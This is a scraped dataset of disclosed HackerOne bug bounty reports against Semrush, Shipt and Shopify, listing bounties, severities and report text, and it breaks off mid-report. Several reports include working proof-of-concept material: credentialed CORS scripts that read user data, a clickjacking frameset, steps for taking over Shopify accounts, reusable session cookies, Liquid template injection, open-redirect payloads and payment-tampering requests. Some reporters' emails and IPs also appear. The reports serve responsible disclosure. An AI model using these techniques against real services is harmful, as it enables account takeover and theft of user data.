POC 2

open https://example.com in browser then inspect the page and go to console.
run the following code in console and you would find it pops up user information

Code 277 BytesWrap lines Copy Download1var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/████/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
Exploit
Code 310 BytesWrap lines Copy Download1<html>
2<script>
3var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.semrush.com/organic-traffic-insights/api/rest/1.2/users/███/projects?_=1496248656402',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
4</script>
5</html>
Open above code in any browser and you would find it pops up user information like the attachment.
Comment
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server
How to fix
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.1 attachment:F190113: cors.PNG",https://hackerone.com/reports/235200,Massachusetts,United States,Boston,2017,6,1,1,44
Semrush,501-1000,0.0,10m-50m,$100.00,Low,2.0,Violation of Secure Design Principles,Error Page Content Spoofing or Text Injection ,"asad_anwar  submitted a report to Semrush.Mar 20th (5 years ago)i want to report a context spoofing or text injection at u.semrush.com
Impact
Fix & Mitigation:
Fix 404 error page to a new who not allow text content injection1 attachment:F273791: sem.PNG",https://hackerone.com/reports/327671,Massachusetts,United States,Boston,2018,3,20,7,56
Semrush,501-1000,0.0,10m-50m,$150.00,Low,2.0,UI Redressing (Clickjacking),Following links are vulnerable to clickjacking,"karma1  submitted a report to Semrush.Nov 10th (5 years ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report!

Summary: [The below listed links, dont have X-FRAME-OPTIONS set to DENY or SAMEORIGIN and they are vulnerable to clickjacking]
Description: [The following url can be easily vulnerable to clickjacking]
Browsers Verified In:

[Firefox V56]

Steps To Reproduce: [add details for how we can reproduce the issue]

[Run below code from browser and you will see listed links are vulnerable to clickjacking attack]
[<!DOCTYPE html>
<html>


Code 191 BytesWrap lines Copy Download1<frameset cols=""25%,*,25%"">
2  <frame src=""https://www.semrush.com/?l=us"">
3  <frame src=""https://www.semrush.com/academy/"">
4  <frame src=""https://www.semrush.com/ranking-factors/"">
5</frameset>
</html>]
Following links are vulnerable to clickjacking

https://www.semrush.com/semrush-opensearch.xml
https://www.semrush.com/academy/
https://www.semrush.com/ranking-factors/
https://www.semrush.com/manifest.json
https://www.semrush.com/?l=us
https://www.semrush.com/blog/
https://www.semrush.com/ 
https://www.semrush.com/prices/
https://www.semrush.com/.
https://www.semrush.com/.?l=us

Supporting Material/References:

Screenshot is attached with ticket
1 attachment:F238475: Tryit_Editor_v3.5_-_Google_Chrome.jpg",https://hackerone.com/reports/289246,Massachusetts,United States,Boston,2017,11,10,18,29
Semrush,501-1000,0.0,10m-50m,"$3,000.00",High,7.95,Information Disclosure,Github information leaked,a_l_i_c_e  submitted a report to Semrush.Aug 19th (3 years ago),https://hackerone.com/reports/676212,Massachusetts,United States,Boston,2019,8,19,7,57
Semrush,501-1000,0.0,10m-50m,$500.00,Medium,5.0,Insecure Direct Object Reference (IDOR),IDOR in marketing calendar tool,"a_d_a_m  submitted a report to Semrush.Feb 16th (3 years ago)INTRODUCTION
I used two accounts to search for this vulnerability:
Id: █████ Email: ██████
Id: ███ Email: ███
IP used:
78.194.169.36
Endpoint URL:
https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=CALENDAR_ID
EXPLOITATION
Description of Security Issue:
When a marketing calendar is loaded in the browser, the site sends a request such as this: Image F718449: Capture.PNG 85.80 KiBZoom in Zoom out Copy Download.
This request returns information such as if the owner has connected a google analytic account and the owner's user id associated with the calendar with the id pass in parameter. The problem comes from the fact that it is not verified that the user making the request has the calendar or that the person is invited to consult it.
RESOLUTION
Check that the user making the request has the calendar or that the person is invited to consult the calendar.
Impact
Exploit scenario for this vulnerability:


A user such as a concurrent service could by bruteforcing the ""calendar_id"" parameter establish a list of all calendars and the number of unique users who have created calendars. It will also know the number of users who have connected their google analytic account on it. This represents bussiness data.


A user who knows someone's user_id (because he was invited to a calendar owned by the victim for example) can by bruteforcing the parameter ""calendar_id"" establish the number of calendar owned by the victim and the number of calendar being linked to a google analytic account.

1 attachment:F718449: Capture.PNG",https://hackerone.com/reports/797685,Massachusetts,United States,Boston,2020,2,16,17,18
Semrush,501-1000,0.0,10m-50m,$505.00,Medium,5.45,Insecure Direct Object Reference (IDOR),IDOR in semrush academy,"a_d_a_m  submitted a report to Semrush.Jan 26th (3 years ago)INTRODUCTION
I used two accounts to search for this vulnerability:

id: 5410425 email: ████-2@anosimple.com
id: 5407773 email: ████@anosimple.com

IP used:
███
Endpoint URL:
https://www.semrush.com/academy/courses/userEnroll
EXPLOITATION
Description of Security Issue:
When a user clicks on the ""Enroll for free"" button in the course pages such as here https://www.semrush.com/academy/library/courses?spec=ALL&lang=en-US, the client makes a request like this: Image F696872: Capture.PNG 149.36 KiBZoom in Zoom out Copy Download.
This page registers the user to the course and returns information concerning the user and the course.
The problem lies in the fact that the server does not verify the userId belongs to the user making the request, so an attacker can pretend to be someone else by modifying the userId with that of the victim.
Steps needed to reproduce bug:
1.Login to your account
2.Go to https://www.semrush.com/academy/library/courses?spec=ALL&lang=en-US
3.On burp suit, press the intercept button on
4.Click on the button ""Enroll for free"" on a random course
5.Forward the requests until you find this POST request: Image F696872: Capture.PNG 149.36 KiBZoom in Zoom out Copy Download
6.Change the userId with that of the victim and send the request
7.The request has been processed by the server
RESOLUTION
Check that the userId belongs to the person who registers to the course.
Impact
Number of people concerned:
The bug affects all semrush academy users.
Exploit scenario for this vulnerability:
An attacker can scrap semrush academy in order to have all the existing courseId or choose a particular course and recover his courseId.
Thereafter either the attacker already knows the victim's userId or he can bruteforce the userId field.
The attacker can then register a user for any course he wishes.
The attacker can also deduce according to the value of ""creationDate"" if the user has registered for the course or not and when.
The attacker also has access to other variables such as ""engagement"", ""status"", ""userEngagement"", etc...1 attachment:F696872: Capture.PNG",https://hackerone.com/reports/783708,Massachusetts,United States,Boston,2020,1,26,18,35
Semrush,501-1000,0.0,10m-50m,$100.00,Low,2.0,Improper Access Control - Generic,CORS misconfiguration which leads to the disclosure of certain data concerning the user.,"a_d_a_m  submitted a report to Semrush.Jan 6th (3 years ago)INTRODUCTION
I used an account to search for this vulnerability:
id: 5407773	email: adam-bugbounty@anosimple.com
IP used:
2a01:e34:ec2a:9240:7d25:26c3:1449:bfe7
endpoint URL:
https://www.semrush.com/content-paywall/api/accesslevel
Summary:
CORS policy too permissive.
EXPLOITATION
Description of Security Issue:
When we navigate on semrush we are led to make a request like this: █████
This request returns a JSON response with 4 elements (about Subscription):


product_group :    ex: FREE , GUEST , ....


used_trial : If the user has used his trial period. ex: false , true , null (if he's a guest)


is_custom : I didn't understand this element.


upgraded : I think that says if the user has upgraded their account.


The problem is in the fact that when you send an origin that is not controlled by semrush the server still allows you to send cross-origin query.
Steps needed to reproduce bug:

Put this payload on your website:

Code 396 BytesWrap lines Copy Download1
2var invocation = new XMLHttpRequest();
3
4  invocation.onreadystatechange = function() {
5    if (invocation.readyState == XMLHttpRequest.DONE) {
6      alert(invocation.response);
7    }
8  }
9
10function cors(){
11  if(invocation) {
12    invocation.open('GET', ""https://www.semrush.com/content-paywall/api/accesslevel"", true);
13    invocation.withCredentials = true;
14    invocation.send(); 
15  }
16}
17
18cors();
19


Connect you on semrush and visit the evil website


Congratulations your website has stolen some of your data!


FIX THE BUG
Stop setting Access-Control-Allow-Origin: .... and Access-Control-Allow-Credentials: true when the origin is not known.
Thank you and I remain at your disposal if necessary
Have a nice evening :)
Impact
This allows all sites to access certain data about visitors who have semrush.",https://hackerone.com/reports/769058,Massachusetts,United States,Boston,2020,1,6,22,3
Semrush,501-1000,0.0,10m-50m,"$5,000.00",Critical,9.5,Improper Access Control - Generic,IDOR in the https://market.semrush.com/,albatraoz  submitted a report to Semrush.Apr 2nd (3 years ago),https://hackerone.com/reports/837400,Massachusetts,United States,Boston,2020,4,2,18,2
Shipt,251-500,0.0,1m-10m,$200.00,Low,2.0,Violation of Secure Design Principles,bypass  the [OKTA] login redirect can  lead to disclosing limited-information about the sub-domain at [ shiptsec.com ],tester1231233  submitted a report to Shipt.Aug 27th (2 years ago),https://hackerone.com/reports/968699,Alabama,United States,Birmingham,2020,8,27,14,13
Shipt,251-500,0.0,1m-10m,$900.00,Medium,5.45,Reliance on Reverse DNS Resolution for a Security-Critical Action,"Multiple Subdomain Takeovers: fly.staging.shipt.com, fly.us-west-2.staging.shipt.com, fly.us-east-1.staging.shipt.com",mubassirpatel  submitted a report to Shipt.May 10th (4 years ago),https://hackerone.com/reports/576857,Alabama,United States,Birmingham,2019,5,10,20,15
Shipt,251-500,0.0,1m-10m,$300.00,Medium,5.45,Cleartext Storage of Sensitive Information,Slack token leaking in stackoverflow and devtimes ,streaak  submitted a report to Shipt.Nov 22nd (4 years ago)Summary by streaakMore information on how I look for slack webhook token leaks can be found here,https://hackerone.com/reports/448849,Alabama,United States,Birmingham,2018,11,22,15,10
Shipt,251-500,0.0,1m-10m,$50.00,No value,0.0,Open Redirect,Open redirect on marketing site,robd4k  submitted a report to Shipt.Apr 8th (6 years ago),https://hackerone.com/reports/219447,Alabama,United States,Birmingham,2017,4,8,6,19
Shipt,251-500,0.0,1m-10m,$750.00,High,7.95,None,Subdomain Takeover at test.shipt.com,"m7mdharoun  submitted a report to Shipt.Jul 28th (4 years ago)Summary by m7mdharounFull Disclose on my blog :) Enjoy

https://www.mohamedharon.com/2018/08/Shipttakeover.html",https://hackerone.com/reports/387760,Alabama,United States,Birmingham,2018,7,28,1,3
Shipt,251-500,0.0,1m-10m,$300.00,Medium,5.45,None,Subdomain takeover at segway.shipt.com,plenum  submitted a report to Shipt.Aug 2nd (4 years ago),https://hackerone.com/reports/389783,Alabama,United States,Birmingham,2018,8,2,21,33
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Information Disclosure,Apache Flink Dashboard exposure at https://streaming-sales-model-production.flink.shopifykloud.com,"savik  submitted a report to Shopify.Jul 15th (about 1 year ago)Hi team
POC

https://streaming-sales-model-production.flink.shopifykloud.com/#/overview

Thanks
Impact
access to flink dashboard",https://hackerone.com/reports/1262907,Ontario,Canada,Ottawa,2021,7,15,9,57
Shopify,5001-10000,0.0,200m-1b,"$22,500.00",Critical,9.5,Privilege Escalation,Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation,"say_ch33se  submitted a report to Shopify.Jun 28th (2 years ago)Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works. Also I can take over the accounts but only the ones which do not have SSO.
To reproduce please follow the steps exactly as I written otherwise you will not be able to reproduce it.
Steps to reproduce: 


Go to your partners account and make a store
Image F886149: 1.png 39.81 KiBZoom in Zoom out Copy Download


Go to your new store and don't verify email, then go to admin/settings/account/youraccountnumber
Image F886151: 2.png 43.75 KiBZoom in Zoom out Copy Download


Change your email to victims email(in my case say_ch33se+111@wearehackerone.com)
Image F886138: 3.png 46.78 KiBZoom in Zoom out Copy Download


Go to burps match and replace and replace your email with the email you want to takeover(in my case say_ch33se+111@wearehackerone.com)
Image F886137: burp1.png 10.71 KiBZoom in Zoom out Copy Download
Image F886139: burp2.png 11.05 KiBZoom in Zoom out Copy Download
Image F886140: burp3.png 27.60 KiBZoom in Zoom out Copy Download


Refresh the account page so its updated with victims email
Image F886141: 4.png 47.11 KiBZoom in Zoom out Copy Download


Still on accounts page click on Upload photo and upload any photo and save
Image F886142: 5.png 52.63 KiBZoom in Zoom out Copy Download


After that uncheck match and replace, refresh and on accounts page change email to your email which you own so you can get a confirmation email
Image F886143: 6.png 52.12 KiBZoom in Zoom out Copy Download


In burp check match and replace again to replace your email with the email you want to takeover(same as above)


Go to your email which you own where is the confirmation link and click on it(in the browser where you are already logged in)


On that page where you verified email, upload another image
Image F886144: 7.png 52.95 KiBZoom in Zoom out Copy Download


Now click on Review accounts


Enter stores password and you'll be greeted with Shopify ID


Click on Set up Shopify ID
Image F886145: 8.png 19.74 KiBZoom in Zoom out Copy Download


And there you got it
Image F886146: 9.png 25.04 KiBZoom in Zoom out Copy Download


Click continue and set up password
Image F886147: 10.png 16.23 KiBZoom in Zoom out Copy Download
Image F886148: 11.png 23.06 KiBZoom in Zoom out Copy Download


Now you can access vitims store and partner account without any problems


Impact
Ability to confirm any email on your-store.myshopify.com and leverage SSO to take over accounts.14 attachments:F886137: burp1.pngF886138: 3.pngF886139: burp2.pngF886140: burp3.pngF886141: 4.pngF886142: 5.pngF886143: 6.pngF886144: 7.pngF886145: 8.pngF886146: 9.pngF886147: 10.pngF886148: 11.pngF886149: 1.pngF886151: 2.pngjenn-shopify Shopify staff  posted a comment. Jun 29th (2 years ago)Hi @say_ch33se,
Thank you for your report! We have validated this and shipped a mitigation. You should no longer be able to reproduce this issue. Our team is out of office today, but we will get back to you tomorrow with an update.say_ch33se   posted a comment. Jun 29th (2 years ago)Wow, you're fast. I did re-check and it definitely doesn't work anymorejenn-shopify Shopify staff  changed the status to Triaged. Jun 29th (2 years ago)Hi @say_ch33se,
Thanks again for your report! And thank you for confirming that you can no longer reproduce this. We are marking this as triaged, and will get back to you soon regarding a bounty for this issue.Shopify  rewarded say_ch33se with a $22,500 bounty. Jun 30th (2 years ago)Hey @say_ch33se!
Thanks again for your report! We’re awarding a bounty of $22,500 for this report, as it would have allowed an attacker to merge their development store with a targeted user’s Shopify ID. In order for this to work, the targeted account must not have previously undergone an account merge and must not have had two-factor authenticated enabled.
Thanks so much for making commerce more secure, and for your creativity in digging up this specific bug when updating an email and avatar together. We hope to hear from you again soon!say_ch33se   posted a comment. Jun 30th (2 years ago)Hey Shopify, thank you for the bounty! I'm amazed with your fast response and professionalism! I will definitely keep searching for more bugs clayton Shopify staff  closed the report and changed the status to Resolved. Jul 2nd (2 years ago)Hi again @say_ch33se. We deployed an initial fix for this back on Monday, but wanted to spend some additional time looking over the code to ensure the issue was fully resolved. That investigation is now complete, so we're closing off this report as resolved.
Thanks once again for the great report!abdulwahaab_ahmed Shopify staff  requested to disclose this report. Sep 14th (2 years ago)say_ch33se   agreed to disclose this report. Sep 15th (2 years ago)  This report has been disclosed. Sep 15th (2 years ago)",https://hackerone.com/reports/910300,Ontario,Canada,Ottawa,2020,6,28,13,9
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF), [CSRF] Activate PayPal Express Checkout,"zombiehelp54  submitted a report to Shopify.Nov 12th (7 years ago)Hi , i have found a CSRF issue when activating PayPal Express checkout.
#Steps to reproduce: 

Create a new store then login with the admin account.
Go to https://<your_store>.myshopify.com/admin/settings/payments and you'll see that PayPal Express checkout is already active , so click the edit button and deactivate it.
Go to the following link: https://<your_store>.myshopify.com/admin/payments/complete_paypal_oauth/41 and you'll see that PayPal Express checkout was activated and you'll get a message saying: Successfully activated your account.

I have been trying to link a malicious paypal email through this CSRF by using the following link:
https://<your_store>.myshopify.com/admin/payments/complete_paypal_oauth/41?verification_token=<PAYPAL_TOKEN> but it doesn't work.
This issue is a little bit confusing when being reproduced since it will only work on a store in which the admin never tried to activate PayPal before because if he did so , a request token will be generated and will be validated for whenever the link is visited.
Please tell me if you are having an issue reproducing it and I will send you a PoC video. 
Thanks.",https://hackerone.com/reports/99321,Ontario,Canada,Ottawa,2015,11,12,16,57
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Improper Authentication - Generic,"""Remember me"" token generated when ""Remember me"" box unchecked","dhaval  submitted a report to Shopify.Dec 18th (7 years ago)Hi,
This is a weird behaviour which regenerates _secure_admin_session_id cookie
Steps to Reproduce :

Navigate to https://www.shopify.com/login
Enter credentials
Enter two factor code from authenticator

Check cookie, There should be cookie named user_auth_token. I believe this token is auto-generated because simply logging into the account creates it
Now we would leverage https://dr4cun0-2.myshopify.com/admin/users.json for re-generating the _secure_admin_session_id and validating the bug
This is a sample request :
GET /admin/users.json HTTP/1.1 Host: dr4cun0-2.myshopify.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: user_auth_token=49a2919e2ae9e22ca4ead68d71fbb5df;  Connection: keep-alive
Response :
HTTP/1.1 200 OK Server: nginx Date: Fri, 18 Dec 2015 21:02:00 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Vary: Accept-Encoding Status: 200 OK X-Frame-Options: DENY X-ShopId: 8256817 X-ShardId: 6 X-Stats-UserId: 7640917 X-XSS-Protection: 1; mode=block; report=/xss-report/a6f1fcdb-fdaf-47e3-880e-b1c584f3cbf1?source%5Baction%5D=index&source%5Bcontroller%5D=admin%2Fusers&source%5Bsection%5D=admin Set-Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; path=/admin; secure; HttpOnly X-Request-Id: a6f1fcdb-fdaf-47e3-880e-b1c584f3cbf1 P3P: CP=""NOI DSP COR NID ADMa OPTa OUR NOR"" X-Dc: ash X-Content-Type-Options: nosniff Content-Length: 338
{""users"":[{""id"":7640917,""first_name"":""Dhaval"",""email"":""dhruvchauhan1711@gmail.com"",""url"":""http:\/\/javascript:\/\/alert(1)\/\/"",""im"":null,""screen_name"":null,""phone"":"""",""last_name"":""Chauhan"",""account_owner"":true,""receive_announcements"":1,""bio"":"""",""permissions"":[""full""],""user_type"":""regular"",""phone_validated?"":false,""tfa_enabled?"":true}]}
Notice : Set-Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; path=/admin; secure; HttpOnly
This should be different that the one in the browser
Issue :

Now logout in the browser

Try Request :
GET /admin/users.json HTTP/1.1 Host: dr4cun0-2.myshopify.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: _secure_admin_session_id=7c76c5ad72f389c4d5989f7634cdbb5a; user_auth_token=49a2919e2ae9e22ca4ead68d71fbb5df;  Connection: keep-alive
Response :
HTTP/1.1 200 OK Server: nginx Date: Fri, 18 Dec 2015 21:10:43 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Vary: Accept-Encoding Status: 200 OK X-Frame-Options: DENY X-ShopId: 8256817 X-ShardId: 6 X-Stats-UserId: 7640917 X-XSS-Protection: 1; mode=block; report=/xss-report/1274b8cc-c272-48d4-869b-c87f3e939554?source%5Baction%5D=index&source%5Bcontroller%5D=admin%2Fusers&source%5Bsection%5D=admin X-Request-Id: 1274b8cc-c272-48d4-869b-c87f3e939554 P3P: CP=""NOI DSP COR NID ADMa OPTa OUR NOR"" X-Dc: ash X-Content-Type-Options: nosniff Content-Length: 338
{""users"":[{""id"":7640917,""first_name"":""Dhaval"",""email"":""dhruvchauhan1711@gmail.com"",""url"":""http:\/\/javascript:\/\/alert(1)\/\/"",""im"":null,""screen_name"":null,""phone"":"""",""last_name"":""Chauhan"",""account_owner"":true,""receive_announcements"":1,""bio"":"""",""permissions"":[""full""],""user_type"":""regular"",""phone_validated?"":false,""tfa_enabled?"":true}]}
So keeping the same auto-generated user_auth_token and new _secure_admin_session_id
we can access the previous session in the browser as well
Issue :

Auto generated token not being expired after logout
Leveraging users.json to re-generate token which does not expire at logout as well

Technically
Once obtain a user_auth_token and get full access to the users account. Also you get the unlimited access because logout from victim side does not affect the new session nor the user_auth_token",https://hackerone.com/reports/105991,Ontario,Canada,Ottawa,2015,12,18,21,25
Shopify,5001-10000,0.0,200m-1b,"$1,500.00",No value,0.0,Code Injection,'Limited' RCE in certain places where Liquid is accepted,"brakhane  submitted a report to Shopify.Nov 6th (7 years ago)Short
Certain interfaces where a shop owner/administrator is able to utilize Liquid have access to methods and properties of certain Drops. This allows calling all methods of the object and access to all properties. While this sounds bad, it seems to be very limited and seems to be 'only' usable for Information Disclosure.
PoC


Go to your shop admin and navigate to the Notifcation settings


Edit the New Order Template and place the following text into the textbox (also shown in the Malicious Template screenshot:
{{ methods | json }}
{{ systemu }}
{{ class }}
{{ to_yaml}}


Click the Preview Button to have your code executed, results are shown in the Malicious Template Rendered screenshot.


Affected parts of the system
Almost all of the Notification Email Templates are affected. It looks like one has access to an OrderDrop and DraftOrderDrop instance (verifyable throigh {{ class }} or similar methods which expose the class name). Please see the attached Affected Mail Templates screenshot, all templates which do have a Revert to default button rendered are affected.
The thank you page of the checkout is also affected, please see the Checkout Template and Checkout Rendering screenshots which are attached.
Limitations
I wasn't able to supply arguments to the methods exposed through this method, but one is still able to call methods which don't accept any. But just because I couldn't find a way doesn't mean there isn't any.
Impact


One has (at least) the ability to execute instance methods with no arguments and read access to certain otherwise hidden fields via the to_yaml method. Depending on the actual code which is flawed it might be even possible to execute methods with user supplied arguments which would probably result in a server breach (there are very intersting methods like systemu, real_call, instance_eval and instance_exec.


This bypasses access restrictions to certain hidden/filtered fields, like a hashed user password. For example,  a malicious admin can force the delivery of the  Real Order Mail Rendered to an address controlled by him if he does the following:


Ensure the last user who touched an order is a desired victim (e.g. the shop owner)


Edit the customers email to an attacker controlled one via the Customer admin interface


Resend an order confirmation mail which is prepared to render like Real Order Rendering in an Email, by placing {{ to_yaml }} in the template


Final words
Depending on the real flaw in the code this might be something which needs to be addressed by the Liquid library. I would be very pleased if you could disclose what kind of condition exactly led to this flaw. It might be worth chaning Liquid in a way to guard against this kind of flaw as users expect it to be secure by default.
Please let me know if you need any additional information here, I hope I was clear enough with my explainations. I'm still a little disappointed that I didn't manage to achieve 'real' RCE here, but I'm happy on the other side to report this asap even without 'real' RCE so you could fix this asap. I discovered this approx. 18h ago by accident and couldn't spend that much time on developing a PoC.6 attachments:F60587: Malicious_Template_Rendered.pngF60588: Affected_Mail_Templates.pngF60589: Malicious_Template.pngF60590: Real_Order_Mail_Rendering.pngF60591: Checkout_Template.pngF60592: Checkout_Rendering.png",https://hackerone.com/reports/98259,Ontario,Canada,Ottawa,2015,11,6,13,37
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Open Redirect,(BYPASS) Open Redirect after login at http://ecommerce.shopify.com,"jamesclyde  submitted a report to Shopify.Jul 30th (6 years ago)Hi,
The users can be redirected to some other site which is in control of the attacker from http://ecommerce.shopify.com/accounts
Let's say user is attacker asked victim to login from the here :
https://ecommerce.shopify.com/accounts?return_to=%40evil.com/
When victim enters the password he is redirected to https://evil.com
These can be controlled by the attacker and used in other attacks
Works in all browsers!!",https://hackerone.com/reports/155222,Ontario,Canada,Ottawa,2016,7,30,0,49
Shopify,5001-10000,0.0,200m-1b,"$1,000.00",No value,0.0,Cross-Site Request Forgery (CSRF),(BYPASS) Open redirect and XSS in supporthiring.shopify.com,"jamesclyde  submitted a report to Shopify.Aug 11th (6 years ago)Hello,
The users can be redirected to some other site which is in control of the attacker from 
Vulnerable parameter: path=
You have a protection here at path= but it bypass the parameter if you add a double slash, like %2F%2F.
Let's say user is attacker asked victim to came to this page: :
http://supporthiring.shopify.com/apps/locksmith/resource/pages/gauntlet-challenge?&path=%2F%2Fevil.com
Victim will be see a 404 error page and after 2 seconds he will be redirected to: https://evil.com
These can be controlled by the attacker and used in other attacks
Works in all browsers!!",https://hackerone.com/reports/158434,Ontario,Canada,Ottawa,2016,8,11,11,28
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Improper Authentication - Generic,(FULL PATH DISCLOSURE) Unknown MySQL server host 'shardm-reader.chi2.shopify.io',"jamesclyde  submitted a report to Shopify.Aug 9th (6 years ago)Hello,
Found a website of you guys that is poiting to: shardm-reader.chi2.shopify.io'
This domain is disclosure fill path because there is none MySQL server host.
POC: https://104.196.154.1/
Response a whole page with path disclosures:
lib/patches/mysql_monitoring.rb:19:in connect' lib/patches/mysql_monitoring.rb:19:in block in raw_connect_with_monitoring'
lib/patches/mysql_monitoring.rb:18:in raw_connect_with_monitoring' lib/routing/connection.rb:15:in connection'
app/models/concerns/benchmarking.rb:15:in block (2 levels) in add_benchmark_around_method' app/models/concerns/benchmarking.rb:24:in with_benchmark'
app/models/concerns/benchmarking.rb:14:in block in add_benchmark_around_method' app/models/shop.rb:619:in for_domain'
app/controllers/application_controller.rb:303:in shop_for' app/controllers/application_controller.rb:96:in with_shop_fallback'
app/controllers/application_controller.rb:87:in with_shop' app/controllers/application_controller.rb:73:in set_billing_api_request_id'
app/controllers/application_controller.rb:64:in add_request_id_to_log_context' app/controllers/application_controller.rb:245:in conditionally_enable_debug_log'
app/controllers/application_controller.rb:54:in block in identity_cache_memoization' app/controllers/application_controller.rb:54:in identity_cache_memoization'
/artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in call' /artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in block in measure'
/artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:53:in duration' /artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in measure'
/artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:75:in block (3 levels) in statsd_measure' /artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in call'
/artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in block in measure' /artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:53:in duration'
/artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:284:in measure' /artifacts/ruby/2.2.0/bundler/gems/statsd-instrument-50b2496ea65b/lib/statsd/instrument.rb:75:in block (2 levels) in statsd_measure'
semian (0.4.1) lib/semian/mysql2.rb:82:in `block in connect'
Please let me know!!",https://hackerone.com/reports/157876,Ontario,Canada,Ottawa,2016,8,9,14,26
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Open Redirect,[apps.shopify.com] Open Redirect,"bobrov  submitted a report to Shopify.Aug 17th (6 years ago)PoC
https://apps.shopify.com//blackfan.ru/
HTTP Response
Code 123 BytesWrap lines Copy Download1HTTP/1.1 301 Moved Permanently
2Server: Cowboy
3Date: Wed, 17 Aug 2016 11:48:27 GMT
4Connection: close
5Location: //blackfan.ru",https://hackerone.com/reports/160047,Ontario,Canada,Ottawa,2016,8,17,11,48
Shopify,5001-10000,0.0,200m-1b,$500.00,No value,0.0,Cross-Site Request Forgery (CSRF),[CSRF] Install premium themes ,"zombiehelp54  submitted a report to Shopify.Dec 4th (7 years ago)Hi , I have found a CSRF issue in themes.shopify.com when installing premium themes.
#Details:
When going to a premium theme page for example: https://themes.shopify.com/themes/editions/styles/light/ there is a button saying Preview in your store , clicking that button sends a POST request to https://themes.shopify.com/themes/editions/styles/light/demo with an authenticity token to prevent CSRF , but going to the url https://themes.shopify.com/themes/editions/styles/light/demo  directly will get the theme installed without any validation for the authenticity token.
#Steps to reproduce:

Go to themes.myshopify.com then login with your store
Go to https://themes.shopify.com/themes/editions/styles/light/demo and the theme editions will be installed in your shop
To confirm go to https://<your_store>.myshopify.com/admin/themes and you'll see the theme installed there.

Thanks",https://hackerone.com/reports/103351,Ontario,Canada,Ottawa,2015,12,4,1,13
Shopify,5001-10000,0.0,200m-1b,$500.00,Low,2.0,Open Redirect,[ecommerce.shopify.com] Invalidated redirection,"shailesh4594  submitted a report to Shopify.Oct 11th (6 years ago)Hello,
Endpoint : https://ecommerce.shopify.com/auth/shopify?shop=[victim_shop].myshopify.com&return_to=/////example.com
Suppose, victim has not linked his shop with ecommerce.shopify.com portal then an attacker can redirect him on an external website after linking or rejecting. 
Steps to reproduce :

Get logged in as admin in your shop and ecommerce.shopify.com
Open this link : https://ecommerce.shopify.com/auth/shopify?shop=[your-shop].myshopify.com&return_to=/////example.com
If you are logged in then Link These Accounts button and No thanks link will be shown.
Click on Link Account button or No thanks link.
You will be redirected on https://example.com instead of ecommerce.shopify.com
Done

Again, your shop should not be linked to ecommerce.shopify.com.
Suggested Fix : Use more stronger regular expression at this endpoint
Best regards,
ShaileshSummary by shailesh4594Bypassed redirection protection using 5 forward slashes!",https://hackerone.com/reports/175168,Ontario,Canada,Ottawa,2016,10,11,16,47
Shopify,5001-10000,0.0,200m-1b,$500.00,Low,2.0,Business Logic Errors,[h1-2102] [Yaworski's Broskis] Suspected overcharge and chargebacks in PoS,"xiridium  submitted a report to Shopify.Jan 29th (2 years ago)Summary:
NOTE: This one need verification from the side of Shopify as we can't set up a real payment GW or check the logs of the test one
When checking out in PoS and paying with credit card, it is possible to manipulate numbers in the end request to overcharge a client (charge more than the item price) and to send money to the client from the store
Code 447 BytesWrap lines Copy Download1{
2    ""payment"": {
3        ""session_id"": ""9"",
4        ""amount_in"": 1.09,       <<<<<
5        ""amount_rounding"": 0,    <<<<<<<
6        ""amount"": 1.09,   <<<<<<<
7        ""device_id"": 2131722262,
8        ""unique_token"": ""xxx"",
9        ""amount_tip"": 0,
10        ""card_source"": ""manual"",
11        ""auto_finalize"": false,
12        ""user_id"": 64582418454,
13        ""amount_out"": 0,     <<<<<
14        ""location_id"": 52512587798,
15        ""charge"": true
16    }
17}
